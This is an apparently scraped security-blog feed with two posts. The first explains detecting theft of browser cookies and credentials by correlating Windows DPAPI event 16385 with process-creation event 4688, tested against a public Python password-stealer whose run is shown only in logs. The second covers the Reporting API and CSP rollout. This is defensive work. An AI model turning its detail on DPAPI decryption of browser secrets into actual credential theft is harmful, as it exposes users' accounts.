 &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserSid&quot;&gt;S-1-5-21-3457937927-2839227994-823803824-1104&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserName&quot;&gt;dadmin&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectDomainName&quot;&gt;CONTOSO&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectLogonId&quot;&gt;0x30d7c&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MasterKeyId&quot;&gt;0445c766-75f0-4de7-82ad-d9d97aad59f6&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryReason&quot;&gt;0x5c005c&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryServer&quot;&gt;DC01&amp;periodcontoso&amp;periodlocal&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;RecoveryKeyId&quot; &amp;sol&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;FailureId&quot;&gt;0x380000&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>The issue with the 4693 event is that while it is generated if there is DPAPI activity on the system, it unfortunately does not contain information about which process was performing the DPAPI activity, nor does it contain information about which particular secret is being accessed. This is because the
  <strong>Execution ProcessID</strong>
  field in the event will always be the process id of lsass.exe because it is this process that manages the encryption keys for the system, and there is no entry for the description of the data.</p>
<p>It was for this reason that, in recent versions of Windows a new event type was added to help identify the process making the DPAPI call directly. This event was added to the
  <strong>Microsoft-Windows-Crypto-DPAPI</strong>
  stream which manifests in the Event Log in the Applications and Services Logs &gt; Microsoft &gt; Windows &gt; Crypto-DPAPI part of the Event Viewer tree.</p>
<p>The new event is called
  <strong>DPAPIDefInformationEvent</strong>
  and has id 16385, but unfortunately is only emitted to the Debug channel and by default this is not persisted to an Event Log, unless Debug channel logging is enabled. This can be accomplished by enabling it directly in powershell:</p>
<div class="code">
&amp;dollarlog &amp;equals &amp;grave&amp;NewLine   New-Object System&amp;periodDiagnostics&amp;periodEventing&amp;periodReader&amp;periodEventLogConfiguration &amp;grave&amp;NewLine   Microsoft-Windows-Crypto-DPAPI&amp;solDebug&amp;NewLine&amp;dollarlog&amp;periodIsEnabled &amp;equals &amp;dollarTrue&amp;NewLine&amp;dollarlog&amp;periodSaveChanges&amp;lpar&amp;rpar&amp;NewLine
</div>
<p>Once this log is enabled then you should start to see 16385 events generated, and these will contain the real process ids of applications performing DPAPI operations. Note that 16385 events are emitted by the operating system even for data not flagged with CRYPTPROTECT_AUDIT, but to identify the data as owned by the browser, the data description is essential. 16385 events are described later.</p>
<p>You will also want to enable
  <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-process-creation" target="_blank">Audit Process Creation</a> in order to be able to know a current mapping of process ids to process names — more details on that later. You might want to also consider enabling logging of
  <a href="https://learn.microsoft.com/en-gb/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing" target="_blank">full command lines</a>.</p>
<p>
  <strong>Step 2: Collect the events</strong>
</p>
<p>The events you want to collect are:</p>
<ul>
  <li>From Security log:</li><p></p>
<ul>
  <li>
    <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688" target="_blank">4688</a>: "A new process was created."
  </li>
</ul>
  <p></p><li>From Microsoft-Windows-Crypto-DPAPI/Debug log: (enabled above)</li><p></p>
<ul>
  <li>16385: "DPAPIDefInformationEvent"</li>
</ul>
</ul>
<p>These should be collected from all workstations, and persisted into your enterprise logging system for analysis.</p>
<p>
  <strong>Step 3: Write detection logic to detect theft.</strong>
</p>
<p>With these two events is it now possible to detect when an unauthorized application calls into DPAPI to try and decrypt browser secrets.</p>
<p>The general approach is to generate a map of process ids to active processes using the 4688 events, then every time a 16385 event is generated, it is possible to identify the currently running process, and alert if the process does not match an authorized application such as Google Chrome. You might find your enterprise logging software can already keep track of which process ids map to which process names, so feel free to just use that existing functionality.</p>
<p>Let's dive deeper into the events.</p>
<p>A 4688 event looks like this - e.g. here is Chrome browser launching from explorer:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Security-Auditing&quot; Guid&amp;equals&quot;&amp;lcub...&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;4688&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;2&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;0&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;13312&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x8020000000000000&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon06&amp;colon41&amp;period9254105Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;78258343&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;4&quot; ThreadID&amp;equals&quot;54256&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Security&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;WIN-GG82ULGC9GO&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security &amp;sol&gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserSid&quot;&gt;S-1-5-18&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectUserName&quot;&gt;WIN-GG82ULGC9GO&amp;dollar&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectDomainName&quot;&gt;CONTOSO&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;SubjectLogonId&quot;&gt;0xe8c85cc&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">NewProcessId</span>&quot;&gt;<span class="highlight">0x17eac</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessName&quot;&gt;C&amp;colon&amp;bsolProgram Files&amp;bsolGoogle&amp;bsolChrome&amp;bsolApplication&amp;bsolchrome&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TokenElevationType&quot;&gt;&amp;percnt&amp;percnt1938&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProcessId&quot;&gt;0x16d8&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CommandLine&quot;&gt;&quot;C&amp;colon&amp;bsolProgram Files&amp;bsolGoogle&amp;bsolChrome&amp;bsolApplication&amp;bsolchrome&amp;periodexe&quot; &lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetUserSid&quot;&gt;S-1-0-0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetUserName&quot;&gt;-&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetDomainName&quot;&gt;-&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TargetLogonId&quot;&gt;0x0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ParentProcessName&quot;&gt;C&amp;colon&amp;bsolWindows&amp;bsolexplorer&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MandatoryLabel&quot;&gt;S-1-16-8192&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;&amp;NewLine
</div>
<p>The important part here is the
  <strong>NewProcessId</strong>, in hex
  <strong>0x17eac
  </strong>which is
  <strong>97964</strong>.</p>
<p>A 16385 event looks like this:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt;Provider Name&amp;equals&quot;Microsoft-Windows-Crypto-DPAPI&quot; Guid&amp;equals&quot;&amp;lcub...&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;EventID&gt;16385&lt;&amp;solEventID&gt;&amp;NewLine    &lt;Version&gt;0&lt;&amp;solVersion&gt;&amp;NewLine    &lt;Level&gt;4&lt;&amp;solLevel&gt;&amp;NewLine    &lt;Task&gt;64&lt;&amp;solTask&gt;&amp;NewLine    &lt;Opcode&gt;0&lt;&amp;solOpcode&gt;&amp;NewLine    &lt;Keywords&gt;0x2000000000000040&lt;&amp;solKeywords&gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon06&amp;colon42&amp;period1772585Z&quot; &amp;sol&gt;&amp;NewLine    &lt;EventRecordID&gt;826993&lt;&amp;solEventRecordID&gt;&amp;NewLine    &lt;Correlation ActivityID&amp;equals&quot;&amp;lcub777bf68d-7757-0028-b5f6-7b775777da01&amp;rcub&quot; &amp;sol&gt;&amp;NewLine    &lt;Execution ProcessID&amp;equals&quot;1392&quot; ThreadID&amp;equals&quot;57108&quot; &amp;sol&gt;&amp;NewLine    &lt;Channel&gt;Microsoft-Windows-Crypto-DPAPI&amp;solDebug&lt;&amp;solChannel&gt;&amp;NewLine    &lt;Computer&gt;WIN-GG82ULGC9GO&amp;periodcontoso&amp;periodlocal&lt;&amp;solComputer&gt;&amp;NewLine    &lt;Security UserID&amp;equals&quot;S-1-5-18&quot; &amp;sol&gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">OperationType</span>&quot;&gt;<span class="highlight">SPCryptUnprotect</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">DataDescription</span>&quot;&gt;<span class="highlight">Google Chrome</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;MasterKeyGUID&quot;&gt;&amp;lcub4df0861b-07ea-49f4-9a09-1d66fd1131c3&amp;rcub&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;Flags&quot;&gt;0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProtectionFlags&quot;&gt;16&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ReturnValue&quot;&gt;0&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessStartKey&quot;&gt;32651097299526713&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;<span class="highlight">CallerProcessID</span>&quot;&gt;<span class="highlight">97964</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessCreationTime&quot;&gt;133561300019253302&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;PlainTextDataSize&quot;&gt;32&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;&amp;NewLine
</div>
<p>The important parts here are the
  <strong>OperationType</strong>, the
  <strong>DataDescription
  </strong>and the
  <strong>CallerProcessID</strong>.</p>
<p>For DPAPI decrypts, the
  <strong>OperationType
  </strong>will be SPCryptUnprotect.</p>
<p>Each Chromium based browser will tag its data with the product name, e.g. Google Chrome, or Microsoft Edge depending on the owner of the data. This will always appear in the
  <strong>DataDescription
  </strong>field, so it is possible to distinguish browser data from other DPAPI secured data.</p>
<p>Finally, the
  <strong>CallerProcessID
  </strong>will map to the process performing the decryption. In this case, it is 97964 which matches the process ID seen in the 4688 event above, showing that this was likely Google Chrome decrypting its own data! Bear in mind that since these logs only contain the path to the executable, for a full assurance that this is actually Chrome (and not malware pretending to be Chrome, or malware injecting into Chrome), additional protections such as removing administrator access, and application allowlisting could also be used to give a higher assurance of this signal. In recent versions of Chrome or Edge, you might also see logs of decryptions happening in the elevation_service.exe process, which is another legitimate part of the browser's data storage.</p>
<p>To detect unauthorized DPAPI access, you will want to generate a running map of all processes using 4688 events, then look for 16385 events that have a CallerProcessID that does not match a valid caller – Let's try that now.</p>
<p>
  <strong>Testing with a python password stealer</strong>
</p>
<p>We can test that this works with a public script to decrypt passwords taken from
  <a href="https://www.geeksforgeeks.org/how-to-extract-chrome-passwords-in-python/" target="_blank">a public blog</a>. It generates two events, as expected:</p>
<p>Here is the 16385 event, showing that a process is decrypting the "Google Chrome" key.</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;EventID&gt;16385&lt;&amp;solEventID&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon28&amp;colon13&amp;period7891561Z&quot; &amp;sol&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;OperationType&quot;&gt;SPCryptUnprotect&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;DataDescription&quot;&gt;<span class="highlight">Google Chrome</span>&lt;&amp;solData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessID&quot;&gt;<span class="highlight">68768</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CallerProcessCreationTime&quot;&gt;133561312936527018&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;PlainTextDataSize&quot;&gt;32&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>Since the data description being decrypted was "Google Chrome" we know this is an attempt to read Chrome secrets, but to determine the process behind 68768 (0x10ca0), we need to correlate this with a 4688 event.</p>
<p>Here is the corresponding 4688 event from the Security Log (a process start for python3.exe) with the matching process id:</p>
<div class="code">
&lt;Event xmlns&amp;equals&quot;http&amp;colon&amp;sol&amp;solschemas&amp;periodmicrosoft&amp;periodcom&amp;solwin&amp;sol2004&amp;sol08&amp;solevents&amp;solevent&quot;&gt;&amp;NewLine  &lt;System&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;EventID&gt;4688&lt;&amp;solEventID&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;TimeCreated SystemTime&amp;equals&quot;2024-03-28T20&amp;colon28&amp;colon13&amp;period6527871Z&quot; &amp;sol&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine  &lt;&amp;solSystem&gt;&amp;NewLine  &lt;EventData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessId&quot;&gt;<span class="highlight">0x10ca0</span>&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;NewProcessName&quot;&gt;C&amp;colon&amp;bsolpython3&amp;bsolbin&amp;bsolpython3&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;TokenElevationType&quot;&gt;&amp;percnt&amp;percnt1938&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ProcessId&quot;&gt;0xca58&lt;&amp;solData&gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;CommandLine&quot;&gt;<span class="highlight">&quot;c&amp;colon&amp;bsolpython3&amp;bsolbin&amp;bsolpython3&amp;periodexe&quot; steal&amp;lowbarpasswords&amp;periodpy</span>&lt;&amp;solData&gt;&amp;NewLine    &lt; &amp;period&amp;period&amp;period &gt;&amp;NewLine    &lt;Data Name&amp;equals&quot;ParentProcessName&quot;&gt;C&amp;colon&amp;bsolWindows&amp;bsolSystem32&amp;bsolcmd&amp;periodexe&lt;&amp;solData&gt;&amp;NewLine  &lt;&amp;solEventData&gt;&amp;NewLine&lt;&amp;solEvent&gt;
</div>
<p>In this case, the process id matches the python3 executable running a potentially malicious script, so we know this is likely very suspicious behavior, and should trigger an alert immediately! Bear in mind process ids on Windows are not unique so you will want to make sure you use the 4688 event with the timestamp closest, but earlier than, the 16385 event.</p>
<p>
  <strong>Summary</strong>
</p>
<p>This blog has described a technique for strong detection of cookie and credential theft. We hope that all defenders find this post useful. Thanks to Microsoft for adding the DPAPIDefInformationEvent log type, without which this would not be possible.</p>
]]></content:encoded>
<pubDate>2024-04-30T12:14:48.193-04:00</pubDate>
</item>
<item>
<title>Uncovering potential threats to your web application by leveraging security reports</title>
<link>http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html</link>
<guid>http://security.googleblog.com/2024/04/uncovering-potential-threats-to-your.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Yoshi Yamaguchi, Santiago Díaz, Maud Nalpas,  Eiji Kitamura, DevRel team</span>

<p>
<a href="https://www.w3.org/TR/reporting-1/">The Reporting API</a> is an emerging web standard that provides a generic reporting mechanism for issues occurring on the browsers visiting your production website. The reports you receive detail issues such as security violations or soon-to-be-deprecated APIs, from users’ browsers from all over the world.
</p>
<p>
Collecting reports is often as simple as specifying an endpoint URL in the HTTP header; the browser will automatically start forwarding reports covering the issues you are interested in to those endpoints. However, processing and analyzing these reports is not that simple. For example, you may receive a massive number of reports on your endpoint, and it is possible that not all of them will be helpful in identifying the underlying problem. In such circumstances, distilling and fixing issues can be quite a challenge.
</p>
<p>
In this blog post, we'll share how the Google security team uses the Reporting API to detect potential issues and identify the actual problems causing them. We'll also introduce an open source solution, so you can easily replicate Google's approach to processing reports and acting on them.
</p>
<h1>How does the Reporting API work?</h1>


<p>
Some errors only occur in production, on users’ browsers to which you have no access. You won't see these errors locally or during development because there could be unexpected conditions real users, real networks, and real devices are in. With the <a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api">Reporting API</a>, you directly leverage the browser to monitor these errors: the browser catches these errors for you, generates an error report, and sends this report to an endpoint you've specified.
</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-UXHxbjggUXX5XtV3xcXU4QX4FwqrMz8n4Yzvty8W3mCZ8vwSIBchtSvAb74ngaa9XxJ5kWV0AU0IbPD0WsiR1gHyh5ytHLWk5E3HjoKepXSSkvM8e3RCspc-Vox8wfPDaBrD9v0tB5jDriVgyN6lEUEVO_Cm-7Wpd_rIviwysXYwfTwXN1LAVXDE9v0-/s1600/How%20reports%20are%20generated%20and%20sent.png" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-UXHxbjggUXX5XtV3xcXU4QX4FwqrMz8n4Yzvty8W3mCZ8vwSIBchtSvAb74ngaa9XxJ5kWV0AU0IbPD0WsiR1gHyh5ytHLWk5E3HjoKepXSSkvM8e3RCspc-Vox8wfPDaBrD9v0tB5jDriVgyN6lEUEVO_Cm-7Wpd_rIviwysXYwfTwXN1LAVXDE9v0-/s1600/How%20reports%20are%20generated%20and%20sent.png" /></a></div>
<p style="text-align: center;"><i>
How reports are generated and sent.
</i></p>
<p style="text-align: left;">
Errors you can monitor with the Reporting API include:
</p>
<ul>

<li>Security violations: <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">Content-Security-Policy (CSP)</a>, <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">Cross-Origin-Opener-Policy (COOP)</a>, <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy">Cross-Origin-Embedder-Policy (COEP)</a>

</li><li>Deprecated and soon-to-be-deprecated API calls

</li><li>Browser interventions

</li><li>Permissions policy

</li><li>And more 
</li>
</ul>
<p>
For a full list of error types you can monitor, see <a href="https://developer.chrome.com/articles/reporting-api/#use_cases_and_report_types">use cases and report types</a>.
</p>
<p>
The Reporting API is activated and configured using HTTP response headers: you need to declare the endpoint(s) you want the browser to send reports to, and which error types you want to monitor. The browser then sends reports to your endpoint in POST requests whose payload is a list of reports.
</p>
<p>
Example setup:</p><span id="docs-internal-guid-2e7dbd9c-7fff-6711-54c9-a1755c90f135"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>#</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;">&nbsp; </span><span>Example setup to receive CSP</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations reports, Document-Policy</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations reports, and Deprecation reports </span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;">&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Reporting-Endpoints: main-endpoint="https://reports.example/main", default="</span><a href="https://reports.example/default"><span>https://reports.example/default</span></a><span>"</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span># CSP</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations and Document-Policy</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>violations will</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>be</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>sent</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>`main-endpoint`</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Content-Security-Policy:</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>script-src</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>'self';</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>object-src</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>'none';</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>report-to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>main-endpoint;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>Document-Policy:</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>document-write=?0;</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>report-to=main-endpoint;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span># Deprecation</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>reports</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>are generated automatically and don't</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>need</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>an</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>explicit</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>endpoint; they're</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>always</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>sent</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>to</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>the</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>`default`</span><span face="Roboto, sans-serif" style="font-size: 9pt; vertical-align: baseline;"> </span><span>endpoint</span></p></span>
<p><b>Note: </b>Some policies support "report-only" mode. This means the policy sends a report, but doesn't actually enforce the restriction. This can help you gauge if the policy is working effectively.</p>
<p>
Chrome users whose browsers generate reports can see them in <a href="https://developer.chrome.com/docs/devtools/javascript/background-services#reporting-api">DevTools in the Application panel</a>:
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy0AC2pelAI7Ug3qhbhHlfYN7MH97_Dp7mM89u3JsIyQQwAZck5GhCZmz_tlF9mtDfMeFwSxbZ63eMuAteeImDz3xwed34fwzzXpYZLIxoPr9e3e6VTmtN9HqTfNtc2bgAHmWhWOP2MEZGZx1TNKWKEcT-by-IAKj62exZCAG6dwIj3yCYhcpAjAcCdgfr/s1600/Example%20of%20viewing%20reports%20in%20the%20Application%20panel%20of%20DevTools.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy0AC2pelAI7Ug3qhbhHlfYN7MH97_Dp7mM89u3JsIyQQwAZck5GhCZmz_tlF9mtDfMeFwSxbZ63eMuAteeImDz3xwed34fwzzXpYZLIxoPr9e3e6VTmtN9HqTfNtc2bgAHmWhWOP2MEZGZx1TNKWKEcT-by-IAKj62exZCAG6dwIj3yCYhcpAjAcCdgfr/s16000/Example%20of%20viewing%20reports%20in%20the%20Application%20panel%20of%20DevTools.png" /></a></div>
<p style="text-align: center;"><i>
Example of viewing reports in the Application panel of DevTools.
</i></p>
<p style="text-align: left;">
You can generate various violations and see how they are received on a server in <a href="https://developer.chrome.com/docs/capabilities/web-apis/reporting-api#demo_and_code">the reporting endpoint demo</a>:
</p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJTkZ_Nsl1aNEIMnLrONyjUdz8Oy0LYc_AhSmhmt9z5QxRUECbqJf6nQPZV6e0ueDORHlJ739eXJaG8FUwyn04DyGKTQlwkkXYzLCJ0Ow20xbP4K1b-x-MlODmVli-tNkKG8RewYM7x2KvVl1Vvq_RpABJGDmc7yTvb8zN6sl0i65vvBuBzF6OIiNLvPeP/s1600/Example%20violation%20reports.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJTkZ_Nsl1aNEIMnLrONyjUdz8Oy0LYc_AhSmhmt9z5QxRUECbqJf6nQPZV6e0ueDORHlJ739eXJaG8FUwyn04DyGKTQlwkkXYzLCJ0Ow20xbP4K1b-x-MlODmVli-tNkKG8RewYM7x2KvVl1Vvq_RpABJGDmc7yTvb8zN6sl0i65vvBuBzF6OIiNLvPeP/s16000/Example%20violation%20reports.png" /></a></div><p style="text-align: center;"><i>Example violation reports</i></p>
<p style="text-align: left;">
The Reporting API is supported by Chrome, and partially by Safari as of March 2024. For details, see the <a href="https://developer.chrome.com/articles/reporting-api/#browser_support">browser support</a> table.  
</p>
<h1>Google's approach </h1>


<p>
Google benefits from being able to uplift security at scale. Web platform mitigations like <a href="https://developer.mozilla.org/docs/Web/HTTP/CSP">Content Security Policy</a>, <a href="https://developer.mozilla.org/docs/Web/API/Trusted_Types_API">Trusted Types</a>, <a href="https://developer.mozilla.org/docs/Glossary/Fetch_metadata_request_header">Fetch Metadata</a>, and the <a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">Cross-Origin Opener Policy</a> help us engineer away entire classes of vulnerabilities across hundreds of Google products and thousands of individual services, as described in <a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security">this blogpost</a>.
</p>
<p>
One of the engineering challenges of deploying security policies at scale is identifying code locations that are incompatible with new restrictions and that would break if those restrictions were enforced. There is a common 4-step process to solve this problem: 
</p>
<ol>

<li>Roll out policies in <em>report-only mode</em> (<a href="https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only">CSP report-only mode example</a>). This instructs browsers to execute client-side code as usual, but gather information on any events where the policy would be violated if it were enforced. This information is packaged in violation reports that are sent to a reporting endpoint.

</li><li>The violation reports must be triaged to link them to locations in code that are incompatible with the policy. For example, some code bases may be incompatible with security policies because they use a dangerous API or use patterns that mix user data and code.

</li><li>The identified code locations are refactored to make them compatible, for example by using safe versions of dangerous APIs or changing the way user input is mixed with code. These refactorings uplift the security posture of the code base by helping reduce the usage of dangerous coding patterns. 

